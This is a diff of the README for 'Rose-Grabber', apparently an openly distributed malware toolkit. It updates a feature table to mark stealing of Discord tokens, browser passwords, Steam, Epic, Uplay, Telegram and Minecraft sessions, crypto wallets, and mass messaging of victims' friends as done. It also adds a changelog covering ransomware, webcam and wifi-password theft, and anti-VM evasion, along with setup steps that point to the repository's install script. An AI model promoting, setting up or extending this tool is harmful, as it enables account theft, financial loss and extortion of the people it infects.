@@ -5,7 +5,7 @@
 </h1>
 
 <div align="center" style="background-color: #da467d; padding: 20px;">
-    <a href="https://discord.gg/kaDQgjRhg9">
+    <a href="https://discord.gg/sbt9drkvAA">
         <img src="https://img.shields.io/badge/Discord-%23da467d.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
     </a>
     <br>
@@ -47,7 +47,7 @@
   ---
 </div>
 
-[Discord Server]: https://discord.gg/kaDQgjRhg9
+[Discord Server]: https://discord.gg/sbt9drkvAA
 [Telegram Group]: https://t.me/+7MDF550ZlLVhYjUy
 [gumbobr0t's Telegram]: https://t.me/gumbobr0t
 [pierro on GitHub]: https://github.com/xpierroz
@@ -72,17 +72,17 @@
 | Obfuscated Code                              | Use code obfuscation techniques for evasion. | Later |
 | Discord Injection                            | Inject code into Discord processes.         | Done    |
 | Steals Discord Tokens                        | Extract user tokens from Discord.          | Done   |
-| Steals Steam Session                         | Gather active Steam sessions.              | Later   |
-| Steals Epic Session                          | Gather active Epic Games sessions.         | Later   |
-| Steals Uplay Session                         | Gather active Uplay sessions.              | Later   |
-| Steals Battle.Net Session                    | Gather active Battle.Net sessions.         | Later   |
+| Mass DM Discord Friends                      | DM's every user on the victims discord accounts friendlist. | Done   |
+| Steals Steam Session                         | Gather active Steam sessions.              | Done   |
+| Steals Epic Session                          | Gather active Epic Games sessions.         | Done   |
+| Steals Uplay Session                         | Gather active Uplay sessions.              | Done   |
 | Steals Passwords From Many Browsers          | Extract stored passwords.                 | Done    |
 | Steals Cookies From Many Browsers            | Collect browser cookies.                  | Done    |
 | Steals History From Many Browsers            | Access browsing history.                  | Done    |
 | Steals Autofills From Many Browsers          | Extract autofill data.                    | Later   |
-| Steals Minecraft Session Files               | Gather Minecraft session information.      | Later   |
-| Steals Telegram Session Files                | Extract Telegram session data.            | Later   |
-| Steals Crypto Wallets                        | Target cryptocurrency wallets.           | Later   |
+| Steals Minecraft Session Files               | Gather Minecraft session information.      | Done   |
+| Steals Telegram Session Files                | Extract Telegram session data.            | Done   |
+| Steals Crypto Wallets                        | Target cryptocurrency wallets.           | Done   |
 | Steals Roblox Cookies                        | Gather Roblox-related data.               | Done   |
 | Steals IP Information                        | Collect IP addresses.                     | Done   |
 | Steals System Info                           | Gather system-specific details.          | Done   |
@@ -106,10 +106,10 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 
 ## Setup
 
+**By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
 + Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 + Extract the ZIP folder which you just downloaded.
-+ Because of the new install script that is not optimized and not working at all, you now need to manually Install the requirements. To do so, open a cmd in the `components/scrapedata` dir and execute this command. **``pip uninstall crypto && pip uninstall pycryptodome && pip uninstall pycrypto && pip install -r requiremens.txt``**.
-+ To start the program from now on, just double click the start script (`start.bat`) which will directly lead to the builder after successfully installing the requirements.
++ Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/install.bat) to install Rose and then open the UI. To start the program later on, you will need to run the [`start.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.bat).
 
 ## Preview
 <div align="center">
@@ -121,6 +121,16 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 ## Changelog
 
 **Working on crypto miner, rose ransomware & spread malware now.**
+
+- **2.0 (2023-10-02)**
+  - Added hidden path to browser and more
+  - Fixed wifi password stealing
+  - Fixed ransomware
+  - Fixed webcam stealing
+  - Rewrote embeds for discordc class, screenshot and webcam now embedded inside of message
+  - Added Exodus, Telegram, Steam, Minecraft, Uplay and Epic Games session stealing
+  - Fixed install and start script
+  - Fixed antivm not exiting correctly
 
 - **1.9 (2023-09-12)**
   - Rewrote ransomware, changed payment to monero
@@ -163,7 +173,7 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 - [gumbobr0t](https://github.com/gumbobr0t)
 - [killer](https://github.com/Minecraftkillir)
 
-**External Contributions:**
+**External Credits and Contributions:**
 - [Smug246](https://github.com/Smug246)
 - [addi00000](https://github.com/addi00000)
 - [Rdimo](https://github.com/Rdimo)
